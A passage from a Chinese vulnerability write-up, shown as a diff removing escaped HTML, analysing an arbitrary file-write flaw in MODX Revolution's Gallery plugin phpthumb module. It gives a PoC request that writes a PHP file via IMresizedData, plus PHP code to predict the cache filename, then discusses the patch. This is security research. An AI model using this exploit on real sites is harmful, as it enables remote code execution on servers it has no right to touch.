-        case &#39;jpeg&#39;:
-        case &#39;png&#39;:
-        case &#39;gif&#39;:
-        case &#39;bmp&#39;:
-            $ptOptions[&#39;f&#39;] = $ext;
-            break;
-        default:
-            $ptOptions[&#39;f&#39;] = &#39;jpeg&#39;;
-            break;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;如果没有指定&lt;code&gt;f&lt;/code&gt;参数的话，就根据文件后缀将&lt;code&gt;f&lt;/code&gt;赋值。也就是说，如果我们传递了&lt;code&gt;f&lt;/code&gt;参数，也就可以指定任意文件后缀，此处没有任何过滤。&lt;/p&gt;
-
-&lt;p&gt;然后判断&lt;code&gt;src&lt;/code&gt;参数是否是以&lt;code&gt;http&lt;/code&gt;开头，如果不是，则把&lt;code&gt;src&lt;/code&gt;拼接成完整的物理路径：&lt;code&gt;D:/phpStudy/PHPTutorial/WWW/modx-2.6.4-pl/assets/gallery/1/cover.png&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;/* auto-prepend base path if not a URL */
-if (strpos($src, &#39;http&#39;) === false) {
-    $basePath = $modx-&amp;gt;getOption(&#39;base_path&#39;, null, MODX_BASE_PATH);
-    if ($basePath != &#39;/&#39;) {
-        $src = str_replace(basename($basePath), &#39;&#39;, $src);
-        $src = ltrim($src, &#39;/&#39;);
-        $src = $basePath . $src;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;接着把&lt;code&gt;src&lt;/code&gt;路径中的&lt;code&gt;:&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;替换成&lt;code&gt;_&lt;/code&gt;，也就是&lt;code&gt;D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png&lt;/code&gt;，这个字符串将成为最后缓存文件的文件名的前半部分。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$inputSanitized = str_replace(array(&#39;:&#39;, &#39;/&#39;), &#39;_&#39;, $src);
-$cacheFilename = $inputSanitized;
-$cacheFilename .= &#39;.&#39; . md5(serialize($scriptProperties));
-$cacheFilename .= &#39;.&#39; . (!empty($ptOptions[&#39;f&#39;]) ? $ptOptions[&#39;f&#39;] : &#39;png&#39;);
-$cacheKey = $assetsPath . &#39;cache/&#39; . $cacheFilename;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;而文件名后半部分则是&lt;code&gt;md5(serialize($scriptProperties))&lt;/code&gt;的值，把上面的array进行反序列化再MD5，最后拼接上面设置的&lt;code&gt;f&lt;/code&gt;后缀，所以最后的文件名类似&lt;code&gt;D__phpStudy_PHPTutorial_WWW_modx-2.6.4-pl_assets_gallery_1_cover.png.0f0d6092657266f9718061fb8a20730d.png&lt;/code&gt;，由于在实际利用中我们不知道网站物理路径，因此几乎无法猜出这个文件名。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;绕过方式就是利用&lt;code&gt;src&lt;/code&gt;参数，上面代码对&lt;code&gt;src&lt;/code&gt;进行了一个&lt;code&gt;http&lt;/code&gt;判断，假如我们指定&lt;code&gt;src&lt;/code&gt;以&lt;code&gt;http&lt;/code&gt;开头，就不会拼接物理路径，而反序列化时的各个参数均是我们可以控制的，这样我们最终就能得到一个文件名类似&lt;code&gt;http.md5_string.php&lt;/code&gt;的缓存文件。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;构造PoC：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;action=web/phpthumb&amp;amp;src=http&amp;amp;f=php&amp;amp;useRawIMoutput=1&amp;amp;config_prefer_imagemagick=0&amp;amp;IMresizedData=&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;然后写一段代码来生成反序列化数据，此处要注意参数顺序，不同顺序生成的反序列化数据不一样，最终的MD5值也就会变&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$target = array (
-    &amp;quot;action&amp;quot;=&amp;gt; &amp;quot;web/phpthumb&amp;quot;,
-    &amp;quot;src&amp;quot;=&amp;gt; &amp;quot;http&amp;quot;,
-    &amp;quot;f&amp;quot;=&amp;gt; &amp;quot;php&amp;quot;,
-    &amp;quot;useRawIMoutput&amp;quot;=&amp;gt; &amp;quot;1&amp;quot;,
-    &amp;quot;config_prefer_imagemagick&amp;quot;=&amp;gt; &amp;quot;0&amp;quot;,
-    &amp;quot;IMresizedData&amp;quot;=&amp;gt; &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
-);
-$seri = serialize($target);  
-echo md5($seri);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最终会在缓存目录&lt;code&gt;assets/components/gallery/cache&lt;/code&gt;写入文件&lt;code&gt;http.f23566b3b11f5fd29a8189b74ef53daf.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532601619133.png&#34; alt=&#34;1532601619133&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x04-补丁分析&#34;&gt;0x04 补丁分析&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/modxcms/revolution/pull/13979/&#34;&gt;https://github.com/modxcms/revolution/pull/13979/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532602450085.png&#34; alt=&#34;1532602450085&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;补丁主要是对可传入的参数进行了限制，只允许公共参数(public parameters)，这样就避免了直接传入私有参数改变程序逻辑。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
-
-&lt;p&gt;该漏洞的利用条件虽然有一定版本和插件限制，但是在互联网上&lt;code&gt;Gallery&lt;/code&gt;插件的使用量并不小，相关站点需要多加防范。&lt;/p&gt;
-
-&lt;p&gt;此次漏洞应该归结于&lt;code&gt;phpthumb&lt;/code&gt;模块，一是接口直接对外暴露，二是对文件操作缺少过滤。在&lt;code&gt;MODx&lt;/code&gt;中的两个版本均受到影响，分别是 &lt;code&gt;1.7.14-201604151303&lt;/code&gt;和&lt;code&gt;1.7.14-201608101311&lt;/code&gt; ，在&lt;code&gt;Github&lt;/code&gt;上搜索了几个使用该库的&lt;code&gt;CMS&lt;/code&gt;，发现代码结构几乎一致，不排除也能直接利用的情况，有兴趣的可以研究一下。&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
